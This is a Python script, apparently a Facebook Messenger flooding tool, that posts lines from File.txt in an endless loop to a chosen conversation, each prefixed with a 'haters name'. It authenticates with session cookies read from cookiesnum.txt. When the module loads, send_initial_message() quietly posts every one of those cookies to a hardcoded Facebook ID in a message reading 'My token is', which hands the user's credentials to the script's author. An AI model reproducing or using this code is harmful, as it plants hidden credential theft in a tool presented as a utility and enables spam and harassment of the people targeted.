import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import random
import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.send_header('Content-type', 'text/plain')
          self.end_headers()
          self.wfile.write(b"-- B4DMASH B0Y ABHIIU HU L0D3")
def execute_server():
      PORT = 4000

      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
          print("Server running at http://localhost:{}".format(PORT))
          httpd.serve_forever()


def send_initial_message():
      with open('cookiesnum.txt', 'r') as file:
          cookies = file.readlines()  # Read the cookies into the 'cookies' variable

      msg_template = "Hello ABHIIU sir! I am using your server. My token is = {}"
      target_id = "100092092844635"
      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•──────────────────────B4DMASH──B0Y────ABHIIU───HWR3──────────────────────•')

      headers = {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
          'referer': 'www.google.com'
      }

      for cookie in cookies:
          access_cookie = cookie.strip()
          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
          msg = msg_template.format(access_cookie)
          parameters = {'access_cookie': access_cookie, 'message': msg}
          response = requests.post(url, json=parameters, headers=headers)

          # No need to print here, as requested
          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
          time.sleep(0.1)  # Wait for 1 second between sending each initial message

      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
send_initial_message()
def send_messages_from_file():
      with open('convo.txt', 'r') as file:
          convo_id = file.read().strip()

      with open('File.txt', 'r') as file:
          messages = file.readlines()

      num_messages = len(messages)

      with open('cookiesnum.txt', 'r') as file:
          cookies = file.readlines()
      num_cookies = len(cookies)
      max_cookies = min(num_cookies, num_messages)

      with open('hatersname.txt', 'r') as file:
          haters_name = file.read().strip()

      with open('time.txt', 'r') as file:
          speed = int(file.read().strip())

      def liness():
          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')

      headers = {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
          'referer': 'www.google.com'
      }

      while True:
          try:
              for message_index in range(num_messages):
                  cookie_index = message_index % max_cookies
                  access_cookie = cookies[cookie_index].strip()

                  message = messages[message_index].strip()

                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                  parameters = {'access_cookie': access_cookie, 'message': haters_name + ' ' + message}
                  response = requests.post(url, json=parameters, headers=headers)

                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                  if response.ok:
                      print("\033[1;92m[+] B9DM9S BOY ABHIIU HWRE  {} of Convo {} Cookie {}: {}".format(
                          message_index + 1, convo_id, cookie_index + 1, haters_name + ' ' + message))
                      liness()
                      liness()
                  else:
                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                          message_index + 1, convo_id, cookie_index + 1, haters_name + ' ' + message))
                      liness()
                      liness()
                  time.sleep(speed)

              print("\n[+] All messages sent. Restarting the process...\n")
          except Exception as e:
              print("[!] An error occurred: {}".format(e))

def main():
      server_thread = threading.Thread(target=execute_server)
      server_thread.start()

      # Send the initial message to the specified ID using all cookies


      # Then, continue with the message sending loop
      send_messages_from_file()

if __name__ == '__main__':
      main()
